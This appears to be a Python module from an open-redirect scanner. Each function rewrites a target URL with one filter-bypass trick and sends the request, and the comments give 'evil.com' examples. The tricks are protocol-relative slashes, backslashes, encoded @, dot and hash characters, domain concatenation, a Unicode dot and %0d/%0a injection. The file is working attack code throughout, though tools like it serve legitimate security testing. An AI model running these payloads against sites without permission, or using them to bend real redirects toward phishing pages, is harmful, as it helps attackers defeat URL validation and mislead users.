from lib.main_parser import make_request

def domain_change(path, headers, host, domain, options, domain_to_replace):

    # Simply try to change the domain
    # Example: ?redirect=https://example.com --> ?redirect=https://evil.com
    
    path = path.replace(domain_to_replace, "wrongway.com")

    make_request(headers, options, host, path)

def forward_slash(path, headers, host, domain, options, domain_to_replace):

    # Bypass the filter when protocol is blacklisted using //
    # Example: ?redirect=https://example.com --> ?redirect=//evil.com
    
    path = path.replace("://", "//").replace(domain_to_replace, "wrongway.com")

    make_request(headers, options, host, path)


def back_slash(path, headers, host, domain, options, domain_to_replace):

    # Bypass the filter when double slash is blacklisted using \\
    # Example: ?redirect=https://example.com --> ?redirect=\evil.com
    
    path = path.replace("://", "\\").replace(domain_to_replace, "wrongway.com")

    make_request(headers, options, host, path)


def double_slash(path, headers, host, domain, options, domain_to_replace):

    # Bypass the filter when double slash is blacklisted using http: or https:
    # Example: ?redirect=https://example.com --> ?redirect=https:example.com
    
    path = path.replace("://", ":").replace(domain_to_replace, "wrongway.com")

    make_request(headers, options, host, path)


def encoded_at_sign(path, headers, host, domain, options, domain_to_replace):

    # Bypass the filter using %40
    # Example: ?redirect=example.com --> ?redirect=example.com%40evil.com
    
    path = path.replace(domain_to_replace, f"{domain}%40wrongway.com")

    make_request(headers, options, host, path)


def concatenation(path, headers, host, domain, options, domain_to_replace):

    # Bypass the filter if it only checks for domain name
    # Example: ?redirect=example.com --> ?redirect=example.comevil.com
    
    path = path.replace(domain_to_replace, f"{domain}wrongway.com")

    make_request(headers, options, host, path)


def encoded_dot(path, headers, host, domain, options, domain_to_replace):

    # Bypass the filter if it only checks for domain name using a dot %2e
    # Example: ?redirect=example.com --> ?redirect=example.com%2eevil.com
    
    path = path.replace(domain_to_replace, f"{domain}%2ewrongway.com")

    make_request(headers, options, host, path)


def question_mark(path, headers, host, domain, options, domain_to_replace):

    # Bypass the filter if it only checks for domain name using a query/question mark ?
    # Example: ?redirect=example.com --> ?redirect=evil.com?example.com
    
    path = path.replace(domain_to_replace, f"wrongway.com?{domain}")

    make_request(headers, options, host, path)

def encoded_hash(path, headers, host, domain, options, domain_to_replace):

    # Bypass the filter if it only checks for domain name using a hash %23
    # Example: ?redirect=example.com --> ?redirect=evil.com%23example.com
    
    path = path.replace(domain_to_replace, f"wrongway.com%23{domain}")

    make_request(headers, options, host, path)


def symbol(path, headers, host, domain, options, domain_to_replace):

    # Bypass the filter using a ° symbol
    # Example: Example: ?redirect=example.com --> ?redirect=example.com/°evil.com
    
    path = path.replace(domain_to_replace, f"{domain}/°wrongway.com")

    make_request(headers, options, host, path)


def chinese_chars(path, headers, host, domain, options, domain_to_replace):

    # Bypass the filter using a url encoded Chinese dot %E3%80%82
    # Example: ?redirect=example.com --> ?redirect=evil.com%E3%80%82%23example.com
    
    path = path.replace(domain_to_replace, f"wrongway.com%E3%80%82%23{domain}")

    make_request(headers, options, host, path)


def null_bytes(path, headers, host, domain, options, domain_to_replace):

    null_bytes_chars = ["%0d", "%0a"]

    # Bypass the filter if it only allows you to control the path using a nullbyte %0d or %0a
    # Example: ?redirect=/ --> ?redirect=/%0d/evil.com

    for byte in null_bytes_chars:
        
        if "%0d" in path:
            path = path.replace("%0d", "%0a")
        
        else:

            if "://" in path:
                path = path.replace(domain_to_replace, f"{byte}/wrongway.com")
            else:
                path = path.replace(domain_to_replace, f"/{byte}/wrongway.com")
        
        make_request(headers, options, host, path)

